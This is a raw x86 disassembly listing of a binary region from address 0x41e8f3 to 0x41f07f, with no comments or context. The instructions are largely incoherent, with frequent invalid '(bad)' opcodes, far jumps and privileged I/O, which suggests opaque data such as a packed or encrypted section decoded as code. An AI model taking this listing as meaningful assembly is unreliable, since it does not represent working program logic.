  41e8f3:	sbb    BYTE PTR [eax+0x4491774a],ch
  41e8f9:	jecxz  0x41e896
  41e8fb:	and    ah,BYTE PTR ds:0x22235980
  41e901:	(bad)  
  41e902:	pop    ds
  41e903:	je     0x41e8ce
  41e905:	adc    BYTE PTR [edx],cl
  41e907:	xchg   edi,eax
  41e908:	dec    ebp
  41e909:	jb     0x41e939
  41e90b:	fsubr  DWORD PTR [eax]
  41e90d:	adc    BYTE PTR [esi],ch
  41e90f:	or     DWORD PTR [ebx],0xd96c3414
  41e915:	and    edi,DWORD PTR [ebx]
  41e917:	jmp    0x7483642d
  41e91c:	cmp    DWORD PTR [eax-0x1d19bb0e],esp
  41e922:	push   esi
  41e923:	adc    ch,ch
  41e925:	popa   
  41e926:	repnz rcl edi,1
  41e929:	inc    eax
  41e92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e92b:	push   0xffffff8e
  41e92d:	sti    
  41e92e:	pop    ecx
  41e92f:	nop
  41e930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e932:	stc    
  41e933:	js     0x41e901
  41e935:	and    ah,BYTE PTR [ecx+0x1b]
  41e938:	mov    ?,ecx
  41e93a:	lea    ecx,[ecx+0x5]
  41e93d:	aas    
  41e93e:	test   BYTE PTR [eax-0x1f29cae7],bl
  41e944:	mov    ebp,0x9cb88a71
  41e94a:	aam    0x2d
  41e94c:	sub    al,0xb9
  41e94e:	cmp    BYTE PTR [ecx],0xc
  41e951:	jmp    0x66:0xf0c0817a
  41e958:	mov    al,ds:0xdf83ba2c
  41e95d:	sbb    esp,DWORD PTR [edi+0x76]
  41e960:	push   edx
  41e961:	int    0xa8
  41e963:	cmp    eax,0xac83744f
  41e968:	fiadd  WORD PTR [ebp+0x47b211e5]
  41e96e:	std    
  41e96f:	stos   DWORD PTR es:[edi],eax
  41e970:	push   es
  41e971:	cmp    al,0x84
  41e973:	aaa    
  41e974:	push   ss
  41e975:	inc    edi
  41e976:	xchg   edi,eax
  41e977:	ins    BYTE PTR es:[edi],dx
  41e978:	cwde   
  41e979:	inc    esi
  41e97a:	cmp    ebx,DWORD PTR [edx+0x6ad5ca4c]
  41e980:	mov    bl,0x57
  41e982:	xchg   esi,eax
  41e983:	shr    BYTE PTR [ecx],0xe1
  41e986:	std    
  41e987:	call   0x5795:0xe7cbf685
  41e98e:	ret    0x43c
  41e991:	call   DWORD PTR [edi+0x522f81d9]
  41e997:	mov    eax,0xf2c4688d
  41e99c:	iret   
  41e99d:	or     DWORD PTR [ebp-0x31514f24],edx
  41e9a3:	and    ecx,esi
  41e9a5:	push   eax
  41e9a6:	xchg   esp,eax
  41e9a7:	or     BYTE PTR [ecx+eax*2],ah
  41e9aa:	pop    ecx
  41e9ab:	fisub  WORD PTR [edx+0x6d]
  41e9ae:	adc    bh,dl
  41e9b0:	and    ecx,edx
  41e9b2:	sbb    ch,BYTE PTR [eax-0x58]
  41e9b5:	popa   
  41e9b6:	cmp    al,0xb4
  41e9b8:	dec    esp
  41e9b9:	in     al,dx
  41e9ba:	aaa    
  41e9bb:	or     bl,BYTE PTR [esp+eiz*8-0x5d]
  41e9bf:	or     ebp,ecx
  41e9c1:	xchg   DWORD PTR [ebp-0x2c],edx
  41e9c4:	add    eax,0x66611d1d
  41e9c9:	or     ch,ch
  41e9cb:	push   0xffffffab
  41e9cd:	or     bl,BYTE PTR [edx]
  41e9cf:	js     0x41e9ec
  41e9d1:	pop    edi
  41e9d2:	and    bh,BYTE PTR [ebp+0x75]
  41e9d5:	in     eax,0x5d
  41e9d7:	or     eax,0xb4bf6ca9
  41e9dc:	xchg   BYTE PTR [esi-0x23],ah
  41e9df:	in     eax,0xea
  41e9e1:	sub    bl,BYTE PTR [esi+0x5c01d4ef]
  41e9e7:	retf   
  41e9e8:	push   0xe0c45c2f
  41e9ed:	in     eax,0xd4
  41e9ef:	push   es
  41e9f0:	push   esp
  41e9f1:	push   esi
  41e9f2:	push   cs
  41e9f3:	xchg   ebp,eax
  41e9f4:	jne    0x41e991
  41e9f6:	and    al,0x28
  41e9f8:	xor    eax,0x66380d8
  41e9fd:	xchg   BYTE PTR [eax],cl
  41e9ff:	(bad)  
  41ea00:	cld    
  41ea01:	repz sub eax,0xed583707
  41ea07:	stos   DWORD PTR es:[edi],eax
  41ea08:	out    0x7d,eax
  41ea0a:	xchg   ebp,eax
  41ea0b:	xor    dh,bh
  41ea0d:	je     0x41e9a8
  41ea0f:	xchg   ebx,eax
  41ea10:	ins    DWORD PTR es:[edi],dx
  41ea11:	xor    eax,0xe9081e03
  41ea16:	scas   eax,DWORD PTR es:[edi]
  41ea17:	outs   dx,BYTE PTR ds:[esi]
  41ea18:	push   0xe6fd2f7e
  41ea1d:	push   esi
  41ea1e:	pop    ecx
  41ea1f:	xor    eax,0xcaa2c7bd
  41ea24:	outs   dx,DWORD PTR ds:[esi]
  41ea25:	sbb    esi,ecx
  41ea27:	mov    ds:0xf1346def,al
  41ea2c:	iret   
  41ea2d:	inc    eax
  41ea2e:	std    
  41ea2f:	or     DWORD PTR ds:0xe67d9e14,esp
  41ea35:	and    DWORD PTR ds:0x15b7f0de,esi
  41ea3b:	shl    DWORD PTR [edi+0x2685c7d7],0x3
  41ea42:	sub    ebx,eax
  41ea44:	push   edx
  41ea45:	jno    0x41ea03
  41ea47:	push   esi
  41ea48:	(bad)  
  41ea49:	fcomp  QWORD PTR [edx]
  41ea4b:	jl     0x41ea9d
  41ea4d:	inc    edi
  41ea4e:	sub    esp,DWORD PTR [esi]
  41ea50:	inc    cx
  41ea52:	push   eax
  41ea53:	mov    cl,0x5
  41ea55:	xchg   ebp,eax
  41ea56:	hlt    
  41ea57:	mov    eax,ds:0xcfe33561
  41ea5c:	out    0xeb,al
  41ea5e:	push   edx
  41ea5f:	fwait
  41ea60:	xor    DWORD PTR [edx],ecx
  41ea62:	clc    
  41ea63:	xor    BYTE PTR [ebp+0x19],0x5e
  41ea67:	push   esp
  41ea68:	cld    
  41ea69:	ja     0x41eaa1
  41ea6b:	add    al,0x6b
  41ea6d:	mov    esi,0xc5b8f0ad
  41ea72:	not    BYTE PTR [eax-0x3d62c429]
  41ea78:	ins    BYTE PTR es:[edi],dx
  41ea79:	aam    0x53
  41ea7b:	outs   dx,BYTE PTR ds:[esi]
  41ea7c:	sbb    al,0x89
  41ea7e:	mov    edi,0xf9846cae
  41ea83:	jmp    0x41ea85
  41ea85:	xor    BYTE PTR [ecx-0xa318d67],0xef
  41ea8c:	rcl    BYTE PTR [esp+ebx*4],1
  41ea8f:	jno    0x41ea22
  41ea91:	out    dx,eax
  41ea92:	fnstcw WORD PTR [edi-0x3e]
  41ea95:	(bad)  
  41ea96:	loopne 0x41eaf2
  41ea98:	ds jmp 0xf589:0xe596bb5b
  41eaa0:	int3   
  41eaa1:	xchg   ecx,eax
  41eaa2:	sahf   
  41eaa3:	ins    DWORD PTR es:[edi],dx
  41eaa4:	sub    eax,0x44b77d96
  41eaa9:	ret    0x3b4f
  41eaac:	iret   
  41eaad:	pop    es
  41eaae:	sub    al,0x4d
  41eab0:	pusha  
  41eab1:	mov    dh,0x85
  41eab3:	js     0x41eaa4
  41eab5:	dec    ebp
  41eab6:	test   BYTE PTR [ebp+0x7dd7b5a6],dl
  41eabc:	fisttp QWORD PTR [ecx]
  41eabe:	rcr    DWORD PTR [esi+0x37],cl
  41eac1:	jp     0x41ea7c
  41eac3:	sbb    al,0x8
  41eac5:	fsubr  QWORD PTR [edi+edx*2]
  41eac8:	adc    BYTE PTR [esi],0xfc
  41eacb:	ins    DWORD PTR es:[edi],dx
  41eacc:	and    eax,0x914aaa3a
  41ead1:	mov    cl,0x20
  41ead3:	jp     0x41ea74
  41ead5:	and    edi,DWORD PTR [esi-0x17a631c7]
  41eadb:	mov    dl,0x58
  41eadd:	sbb    BYTE PTR [ebx],bl
  41eadf:	pop    ss
  41eae0:	mov    ebx,0xa75e1c3d
  41eae5:	cmp    al,dl
  41eae7:	cld    
  41eae8:	push   ss
  41eae9:	addr16 test eax,0xc931bac2
  41eaef:	mov    esp,0x324d8d4b
  41eaf4:	jo     0x41eb1c
  41eaf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaf7:	cmp    edx,ebx
  41eaf9:	cmp    DWORD PTR [esi-0x3e],0x5f
  41eafd:	mov    ?,WORD PTR [ebx-0x2222e265]
  41eb03:	cwde   
  41eb04:	mov    bh,BYTE PTR [edx+eiz*4+0x2f1666c4]
  41eb0b:	hlt    
  41eb0c:	or     BYTE PTR [ebx-0x23],ah
  41eb0f:	pop    ds
  41eb10:	dec    ebx
  41eb11:	iret   
  41eb12:	push   ss
  41eb13:	mov    ah,0x96
  41eb15:	call   0x7ef9cd67
  41eb1a:	sub    dl,dl
  41eb1c:	ss pop ebx
  41eb1e:	fild   WORD PTR [ebx]
  41eb20:	add    eax,0xec333691
  41eb25:	addr16 je 0x41eb84
  41eb28:	push   esi
  41eb29:	ss jbe 0x41eb83
  41eb2c:	popa   
  41eb2d:	jbe    0x41eb8c
  41eb2f:	sub    ah,0x94
  41eb32:	mov    bh,0x83
  41eb34:	xor    al,0x40
  41eb36:	mov    DWORD PTR [edi+0x79],eax
  41eb39:	adc    ch,bh
  41eb3b:	mov    eax,ds:0x859e45e6
  41eb40:	push   ss
  41eb41:	pop    eax
  41eb42:	scas   al,BYTE PTR es:[edi]
  41eb43:	sar    BYTE PTR [eax+0x4f562e57],1
  41eb49:	jnp    0x41eb67
  41eb4b:	sahf   
  41eb4c:	cmp    DWORD PTR [edx],0x7f83d32e
  41eb52:	pusha  
  41eb53:	push   eax
  41eb54:	repnz mov eax,0x883c5179
  41eb5a:	loopne 0x41eb89
  41eb5c:	aad    0xdc
  41eb5e:	test   DWORD PTR [ebp+0x35a952eb],ecx
  41eb64:	and    BYTE PTR gs:0x9b2a674d,dl
  41eb6b:	sahf   
  41eb6c:	push   eax
  41eb6d:	retf   
  41eb6e:	add    BYTE PTR [ebp-0x77b28b1b],cl
  41eb74:	jmp    0x12dd51f1
  41eb79:	jnp    0x41ebca
  41eb7b:	lods   eax,DWORD PTR ds:[esi]
  41eb7c:	fidivr WORD PTR [edi+0x59421a78]
  41eb82:	ss or  al,0xfa
  41eb85:	test   BYTE PTR [eax+0x64],0xa9
  41eb89:	ins    BYTE PTR es:[edi],dx
  41eb8a:	or     ecx,0xdc048255
  41eb90:	jl     0x41eba8
  41eb92:	in     eax,0x58
  41eb94:	not    BYTE PTR [ebp-0x3084a56e]
  41eb9a:	test   al,0xe5
  41eb9c:	mov    ds:0xc00cd7dc,al
  41eba1:	arpl   WORD PTR [edx+eax*2-0x7a],dx
  41eba5:	jecxz  0x41ebef
  41eba7:	or     edx,edx
  41eba9:	popf   
  41ebaa:	fadd   DWORD PTR [esi]
  41ebac:	jl     0x41ebd5
  41ebae:	gs inc edx
  41ebb0:	test   edi,edx
  41ebb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebb3:	jmp    0xaf7b:0x8f1d28e9
  41ebba:	and    dh,cl
  41ebbc:	adc    eax,0xd0e055b5
  41ebc1:	leave  
  41ebc2:	ds nop
  41ebc4:	or     DWORD PTR [ecx],esi
  41ebc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebc7:	cli    
  41ebc8:	mov    WORD PTR [ebx+0x32e8e5ee],fs
  41ebce:	rol    BYTE PTR [edi+edx*4-0x74866a51],cl
  41ebd5:	dec    edx
  41ebd6:	arpl   WORD PTR [edi+ebp*8+0x17909775],bp
  41ebdd:	pusha  
  41ebde:	xchg   edx,eax
  41ebdf:	push   esp
  41ebe0:	neg    DWORD PTR [eax-0x27]
  41ebe3:	and    BYTE PTR [ebx],cl
  41ebe5:	leave  
  41ebe6:	mov    eax,ds:0xfcad130d
  41ebeb:	mov    WORD PTR [ebp-0x46137d4],cs
  41ebf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebf2:	rcl    BYTE PTR [ecx+ebp*8+0x35],1
  41ebf6:	cli    
  41ebf7:	aam    0xe3
  41ebf9:	fldcw  WORD PTR [esp+ebp*4+0x452c4405]
  41ec00:	fmul   QWORD PTR [ebp+0x1285a2e1]
  41ec06:	ins    DWORD PTR es:[edi],dx
  41ec07:	jmp    0x8e087364
  41ec0c:	xor    BYTE PTR [ebx-0x4b22429f],0x30
  41ec13:	cmp    eax,0x42c9323a
  41ec18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec19:	jge    0x41ebcc
  41ec1b:	stc    
  41ec1c:	add    BYTE PTR [edx+eiz*1],0xd
  41ec20:	pop    edx
  41ec21:	xchg   ecx,eax
  41ec22:	int3   
  41ec23:	inc    ebp
  41ec24:	sub    ecx,DWORD PTR [edx+0x47c0069]
  41ec2a:	fsubr  st,st(4)
  41ec2c:	sbb    BYTE PTR [esp+ebx*2+0x716a61a3],0xee
  41ec34:	jle    0x41ec3b
  41ec36:	inc    ecx
  41ec37:	(bad)  
  41ec38:	out    0xbf,eax
  41ec3a:	add    esi,DWORD PTR [edi-0x1f]
  41ec3d:	xor    dh,BYTE PTR [ebx+0x26]
  41ec40:	ror    edx,0x63
  41ec43:	mov    dh,0xb3
  41ec45:	dec    edx
  41ec46:	fisubr WORD PTR [eax]
  41ec48:	ret    0xe415
  41ec4b:	sub    DWORD PTR ds:0x72306382,esp
  41ec51:	fcmovnu st,st(6)
  41ec53:	sub    eax,0x2cacdd8d
  41ec58:	fcomp  QWORD PTR [ebx+0x44]
  41ec5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec5c:	stos   DWORD PTR es:[edi],eax
  41ec5d:	retf   0x4db6
  41ec60:	fincstp 
  41ec62:	cli    
  41ec63:	xlat   BYTE PTR ds:[ebx]
  41ec64:	sbb    eax,0xf59209b2
  41ec69:	popf   
  41ec6a:	popa   
  41ec6b:	test   BYTE PTR [esi+0x7c3e8af7],dh
  41ec71:	mov    ds:0xcbf2894c,eax
  41ec76:	and    edi,esi
  41ec78:	xchg   edi,eax
  41ec79:	adc    DWORD PTR [esi-0x127adbb4],edx
  41ec7f:	es push 0xc948501
  41ec85:	jle    0x41ec28
  41ec87:	cmp    eax,edi
  41ec89:	xor    al,0x62
  41ec8b:	aam    0x9f
  41ec8d:	mov    al,ds:0xd79120f4
  41ec92:	inc    esi
  41ec93:	(bad)  
  41ec94:	xor    edx,DWORD PTR [ecx]
  41ec96:	mov    al,ds:0x354c6509
  41ec9b:	xor    bl,dl
  41ec9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec9e:	and    dh,BYTE PTR [edx]
  41eca0:	jmp    0x41ec41
  41eca2:	retf   0x5294
  41eca5:	test   DWORD PTR [ecx],esp
  41eca7:	sub    al,0x9e
  41eca9:	mov    edx,0x8721ab4e
  41ecae:	ins    DWORD PTR es:[edi],dx
  41ecaf:	jp     0x41ec9e
  41ecb1:	test   al,0x34
  41ecb3:	sar    BYTE PTR ds:0x9859d26d,1
  41ecb9:	gs (bad) 
  41ecbb:	inc    esp
  41ecbc:	pop    eax
  41ecbd:	sub    DWORD PTR [eax],ebp
  41ecbf:	push   eax
  41ecc0:	call   0x7f61:0x7056a8f6
  41ecc7:	in     al,0x44
  41ecc9:	xor    al,0x77
  41eccb:	test   DWORD PTR cs:[eax-0x121bea95],edx
  41ecd2:	sbb    al,0x87
  41ecd4:	mov    esp,DWORD PTR [eax+0x2c]
  41ecd7:	mov    esp,0x65e5095d
  41ecdc:	(bad)  
  41ecdd:	mov    ecx,0x46ccf1a6
  41ece2:	sbb    al,0x4a
  41ece4:	(bad)  
  41ece5:	and    DWORD PTR [edx-0x2205ddff],ecx
  41eceb:	add    DWORD PTR [esi],ebp
  41eced:	inc    ecx
  41ecee:	std    
  41ecef:	sbb    eax,0xc2007c47
  41ecf4:	out    0xcc,al
  41ecf6:	mov    al,0xbe
  41ecf8:	js     0x41ec8d
  41ecfa:	push   ebx
  41ecfb:	dec    edx
  41ecfc:	cmp    ecx,DWORD PTR [ecx+0x2f]
  41ecff:	aaa    
  41ed00:	xchg   ebx,eax
  41ed01:	repnz sbb WORD PTR [esi+0x3],0xffe7
  41ed07:	jae    0x41ed2d
  41ed09:	lods   eax,DWORD PTR ds:[esi]
  41ed0a:	sbb    DWORD PTR [ebx-0x697eb376],ecx
  41ed10:	mov    ebx,0x3cf2e768
  41ed15:	pop    edx
  41ed16:	mov    ecx,0x1bbe37e6
  41ed1b:	iret   
  41ed1c:	sub    BYTE PTR [eax],cl
  41ed1e:	arpl   bx,dx
  41ed20:	fmul   DWORD PTR [edi+ebx*4+0x59]
  41ed24:	fmulp  st(7),st
  41ed26:	jle    0x41eda1
  41ed28:	aad    0xaf
  41ed2a:	jo     0x41ed54
  41ed2c:	pop    ebx
  41ed2d:	mov    ecx,0x7e04c15d
  41ed32:	cdq    
  41ed33:	push   eax
  41ed34:	pop    edi
  41ed35:	fwait
  41ed36:	sub    DWORD PTR ds:0x2c9f5720,eax
  41ed3c:	nop
  41ed3d:	test   ebx,eax
  41ed3f:	ret    0xe8c4
  41ed42:	xchg   ebx,eax
  41ed43:	or     dl,bl
  41ed45:	inc    ebp
  41ed46:	dec    ebp
  41ed47:	or     DWORD PTR [edi+0x1c],ecx
  41ed4a:	and    cl,al
  41ed4c:	jne    0x41ed2c
  41ed4e:	sub    al,0x9b
  41ed50:	(bad)  
  41ed52:	push   0xbd243dcf
  41ed57:	(bad)  
  41ed58:	sub    BYTE PTR [ecx+esi*2],0xf7
  41ed5c:	into   
  41ed5d:	mov    esp,0xf1c30ff7
  41ed62:	fcomp  st(7)
  41ed64:	pop    ds
  41ed65:	imul   esi,DWORD PTR [ebp+0x11],0x21
  41ed69:	push   ebp
  41ed6a:	fsub   QWORD PTR [edi-0x254a7ba3]
  41ed70:	into   
  41ed71:	mov    bh,BYTE PTR [ecx-0x2ba20665]
  41ed77:	aad    0xc
  41ed79:	in     al,dx
  41ed7a:	add    eax,0x50530c8c
  41ed7f:	(bad)  
  41ed80:	call   0x682c:0x3f0bf51
  41ed87:	mov    ebx,0x28a44904
  41ed8c:	push   ecx
  41ed8d:	stos   DWORD PTR es:[edi],eax
  41ed8e:	popa   
  41ed8f:	dec    edx
  41ed90:	loopne 0x41edf6
  41ed92:	les    edx,FWORD PTR [ebp-0x25e00290]
  41ed98:	jb     0x41ed99
  41ed9a:	sub    DWORD PTR [ebp-0x6eb3b3bb],eax
  41eda0:	mov    eax,ds:0xd86e4565
  41eda5:	div    BYTE PTR [esi+0x63]
  41eda8:	mov    ebx,0x5a2c9ef
  41edad:	std    
  41edae:	xchg   ebx,eax
  41edaf:	(bad)  
  41edb0:	pop    ebp
  41edb1:	xchg   BYTE PTR [ebp-0x2b],dl
  41edb4:	xor    bl,BYTE PTR [esi-0x796f4c43]
  41edba:	enter  0x944,0xc8
  41edbe:	xchg   esp,eax
  41edbf:	jg     0x41edf9
  41edc1:	and    eax,ebx
  41edc3:	rol    BYTE PTR [edi-0x60a0dc66],1
  41edc9:	mul    DWORD PTR ds:0x338d9319
  41edcf:	lods   eax,DWORD PTR ds:[esi]
  41edd0:	leave  
  41edd1:	mov    eax,0xf10db229
  41edd6:	push   eax
  41edd7:	cmp    eax,0x2a0076e0
  41eddc:	into   
  41eddd:	mov    ebp,0xec61b8f3
  41ede2:	xchg   ecx,eax
  41ede3:	mov    eax,ds:0x8f95f4bc
  41ede8:	cld    
  41ede9:	mov    esp,0x50759d87
  41edee:	jno    0x41ee0c
  41edf0:	sbb    dh,BYTE PTR [esi]
  41edf2:	sub    al,0xef
  41edf4:	stos   DWORD PTR es:[edi],eax
  41edf5:	and    bh,cl
  41edf7:	aaa    
  41edf8:	push   0x627009a5
  41edfd:	inc    ebp
  41edfe:	and    edx,DWORD PTR [ecx+0x4bce5eba]
  41ee04:	add    ecx,DWORD PTR [eax]
  41ee06:	inc    ebp
  41ee07:	shl    ah,1
  41ee09:	in     eax,0x84
  41ee0b:	mov    edi,0xcfeb1dac
  41ee10:	loopne 0x41ee1f
  41ee12:	fs pop edi
  41ee14:	sub    eax,DWORD PTR [ebp-0x39cda92a]
  41ee1a:	jmp    0x19d30a26
  41ee1f:	rep lods al,BYTE PTR ds:[esi]
  41ee21:	ret    0x8c21
  41ee24:	arpl   dx,ax
  41ee26:	sbb    bl,al
  41ee28:	sti    
  41ee29:	outs   dx,BYTE PTR ds:[esi]
  41ee2a:	retf   
  41ee2b:	das    
  41ee2c:	xlat   BYTE PTR ds:[ebx]
  41ee2d:	dec    esi
  41ee2e:	push   edi
  41ee2f:	inc    edx
  41ee30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee31:	or     BYTE PTR [edx-0x40],0x4
  41ee35:	jns    0x41edbb
  41ee37:	int3   
  41ee38:	popa   
  41ee39:	jb     0x41ee40
  41ee3b:	(bad)  
  41ee3c:	mov    dh,BYTE PTR [edx-0x5]
  41ee3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee40:	pop    esp
  41ee41:	(bad)  
  41ee43:	leave  
  41ee44:	push   ebp
  41ee45:	je     0x41edee
  41ee47:	pop    ecx
  41ee48:	int    0xe4
  41ee4a:	jns    0x41ee6a
  41ee4c:	adc    bl,BYTE PTR [edi-0x53599908]
  41ee52:	sbb    eax,0x817461c9
  41ee57:	lods   al,BYTE PTR ds:[esi]
  41ee58:	mov    al,0x38
  41ee5a:	jne    0x41ee30
  41ee5c:	int3   
  41ee5d:	(bad)  
  41ee5f:	jb     0x41ee99
  41ee61:	push   cs
  41ee62:	and    eax,0x698a26e3
  41ee67:	sar    DWORD PTR [esi-0x4202aab1],cl
  41ee6d:	xor    ah,BYTE PTR [esi-0x3d8104be]
  41ee73:	arpl   WORD PTR [eax+0x4f08e3ae],dx
  41ee79:	das    
  41ee7a:	and    edi,0x2de14565
  41ee80:	mov    dl,0xd8
  41ee82:	dec    ebp
  41ee83:	shl    BYTE PTR [eax+esi*8+0x54],1
  41ee87:	in     al,0x9f
  41ee89:	js     0x41eedb
  41ee8b:	xchg   ebx,eax
  41ee8c:	inc    ecx
  41ee8d:	imul   ecx,DWORD PTR cs:[eax],0x20
  41ee91:	mov    BYTE PTR [edx],ch
  41ee93:	mov    ecx,0x4c89933a
  41ee98:	aas    
  41ee99:	(bad)
  41ee9d:	into   
  41ee9e:	scas   eax,DWORD PTR es:[edi]
  41ee9f:	sub    eax,0x21a28ff9
  41eea4:	arpl   dx,ax
  41eea6:	outs   dx,DWORD PTR ds:[esi]
  41eea7:	cmp    DWORD PTR [ebx+0x2420891e],0x38
  41eeae:	jb     0x41ee47
  41eeb0:	and    bh,al
  41eeb2:	mov    al,bl
  41eeb4:	xor    al,dh
  41eeb6:	xlat   BYTE PTR ds:[ebx]
  41eeb7:	inc    ecx
  41eeb8:	adc    BYTE PTR [eax+0x1635a34b],bl
  41eebe:	xchg   edi,eax
  41eebf:	shr    ch,cl
  41eec1:	adc    DWORD PTR [ecx-0x13],0x46e49324
  41eec8:	mul    DWORD PTR [esp+edx*2-0x20196cfc]
  41eecf:	ror    BYTE PTR [ecx-0x2ac67c20],cl
  41eed5:	mul    BYTE PTR [ecx]
  41eed7:	loop   0x41ee78
  41eed9:	clc    
  41eeda:	ins    BYTE PTR es:[edi],dx
  41eedb:	loope  0x41eec7
  41eedd:	nop
  41eede:	inc    ebp
  41eedf:	pop    esi
  41eee0:	mov    eax,0x4a308029
  41eee5:	mov    ah,0x7a
  41eee7:	popa   
  41eee8:	enter  0x237e,0xf9
  41eeec:	add    DWORD PTR [edx],edx
  41eeee:	sub    al,0x4f
  41eef0:	ja     0x41ef10
  41eef2:	sbb    eax,0xb032ac61
  41eef7:	jb     0x41ef71
  41eef9:	jns    0x41ee92
  41eefb:	cmp    ah,BYTE PTR [ebx]
  41eefd:	mul    DWORD PTR ds:0xf3f43aa0
  41ef03:	cmp    eax,0xd231fa0a
  41ef08:	fnstcw WORD PTR [ebx+edx*4-0x6a]
  41ef0c:	mov    dh,0xe
  41ef0e:	sbb    DWORD PTR [ebp-0x331f3a86],ecx
  41ef14:	xchg   edx,eax
  41ef15:	inc    eax
  41ef16:	retf   0x92a6
  41ef19:	pop    ds
  41ef1a:	imul   edi,DWORD PTR [esi],0x89a3f986
  41ef20:	cmp    DWORD PTR ds:0x2a70bb51,0x83b48fc2
  41ef2a:	jne    0x41ef8c
  41ef2c:	inc    esi
  41ef2d:	push   esi
  41ef2e:	push   edx
  41ef2f:	aaa    
  41ef30:	lea    esp,[edx-0x76]
  41ef33:	dec    ecx
  41ef34:	mov    ds:0x9ca4924e,eax
  41ef39:	or     BYTE PTR [eax-0x41681aa5],bl
  41ef3f:	aam    0xa1
  41ef41:	dec    edi
  41ef42:	mov    DWORD PTR [edi-0x5b0733c],ecx
  41ef48:	pop    es
  41ef49:	mov    ebp,0xe57665b0
  41ef4e:	in     al,0xd1
  41ef50:	iret   
  41ef51:	jge    0x41eede
  41ef53:	cmc    
  41ef54:	out    0xa9,al
  41ef56:	adc    ah,dh
  41ef58:	lods   eax,DWORD PTR ds:[esi]
  41ef59:	cs (bad) 
  41ef5b:	jne    0x41ef8d
  41ef5d:	shl    BYTE PTR [eax],1
  41ef5f:	ins    DWORD PTR es:[edi],dx
  41ef60:	jns    0x41ef64
  41ef62:	dec    ecx
  41ef63:	inc    eax
  41ef64:	loopne 0x41ef1d
  41ef66:	mov    fs,WORD PTR [ebp+0x5307d1b0]
  41ef6c:	scas   al,BYTE PTR es:[edi]
  41ef6d:	outs   dx,BYTE PTR ds:[esi]
  41ef6e:	push   0x6
  41ef70:	inc    ecx
  41ef71:	or     eax,0xacaab8ee
  41ef76:	(bad)  
  41ef77:	push   esi
  41ef78:	mov    ds:0xa4b681a6,eax
  41ef7d:	test   al,0x72
  41ef7f:	mov    dh,0xf6
  41ef81:	and    al,ch
  41ef83:	mov    dl,ah
  41ef85:	xor    eax,0x7fb6722c
  41ef8a:	inc    ecx
  41ef8b:	push   ds
  41ef8c:	call   0x68d90dfe
  41ef91:	jno    0x41efa8
  41ef93:	cmp    DWORD PTR [eax],0x72
  41ef96:	cmp    DWORD PTR [ecx+0xb],ebp
  41ef99:	jns    0x41efbf
  41ef9b:	or     al,BYTE PTR [ebx+0x2d]
  41ef9e:	mov    ebp,0x593ff028
  41efa3:	mov    DWORD PTR [ebp+0x74],edi
  41efa6:	cmp    esp,edi
  41efa8:	push   ebx
  41efa9:	add    al,0x2e
  41efab:	fld    QWORD PTR [eax]
  41efad:	cmp    DWORD PTR [edi-0x2720123a],ebp
  41efb3:	pop    eax
  41efb4:	xchg   esp,eax
  41efb5:	fcom   DWORD PTR [esi+ebx*4]
  41efb8:	mov    ds:0xf7e9a621,al
  41efbd:	outs   dx,BYTE PTR ds:[esi]
  41efbe:	or     DWORD PTR [eax-0x6291e882],edi
  41efc4:	push   eax
  41efc5:	dec    esi
  41efc6:	mov    ch,0xa8
  41efc8:	dec    edi
  41efc9:	or     BYTE PTR [eax+0x6b54f37a],cl
  41efcf:	mov    ebx,0x8c757884
  41efd4:	mov    ebp,0x461951b7
  41efd9:	mov    ebx,0xd240ff43
  41efde:	xchg   ebx,eax
  41efdf:	mov    al,ds:0x4efc87cc
  41efe4:	dec    ecx
  41efe5:	add    eax,0x92adcd8
  41efea:	(bad)  
  41efeb:	xor    edx,DWORD PTR [ecx+0x70fe87f9]
  41eff1:	mov    ecx,0x68abc8d5
  41eff6:	pop    ebx
  41eff7:	stc    
  41eff8:	icebp  
  41eff9:	fsubr  QWORD PTR [ecx-0x80]
  41effc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41effd:	(bad)  
  41effe:	mov    dh,0x56
  41f000:	inc    esi
  41f001:	aas    
  41f002:	mov    ds:0x347fcb40,eax
  41f007:	gs ret 
  41f009:	sbb    eax,0xffd5b7d0
  41f00e:	xor    al,0x12
  41f010:	mov    eax,ds:0x589d801e
  41f015:	fiadd  DWORD PTR [ecx]
  41f017:	adc    al,0x5f
  41f019:	mov    eax,eax
  41f01b:	jl     0x41f058
  41f01d:	(bad)  
  41f01e:	jge    0x41f06d
  41f020:	mov    eax,0x1c45ff48
  41f025:	sbb    DWORD PTR cs:[ebx+esi*1+0x71426f9e],edx
  41f02d:	sub    ah,ah
  41f02f:	loopne 0x41f0a4
  41f031:	shl    DWORD PTR [esi],0x3d
  41f034:	jle    0x41efd2
  41f036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f037:	aaa    
  41f038:	cli    
  41f039:	jmp    0xc32a911c
  41f03e:	mov    ebp,0x5ee84a00
  41f043:	adc    al,0xd7
  41f045:	stos   BYTE PTR es:[edi],al
  41f046:	or     BYTE PTR [esi-0x6b],0x95
  41f04a:	sti    
  41f04b:	jle    0x41f03c
  41f04d:	mov    edx,0xe54447c4
  41f052:	xchg   edi,eax
  41f053:	aad    0xeb
  41f055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f056:	mov    WORD PTR [ecx+edx*2+0xb71f77a],?
  41f05d:	mov    ecx,0x7c009568
  41f062:	out    0x53,eax
  41f064:	call   0x4fc47c9c
  41f069:	stos   BYTE PTR es:[edi],al
  41f06a:	and    al,0xc8
  41f06c:	add    ebx,DWORD PTR [ecx-0xf7a34f2]
  41f072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f073:	inc    ebx
  41f074:	jb     0x41f04f
  41f076:	push   cs
  41f077:	les    esp,FWORD PTR [ecx]
  41f079:	push   eax
  41f07a:	test   eax,0xcc65b613
  41f07f:	scas   eax,DWORD PTR es:[edi]
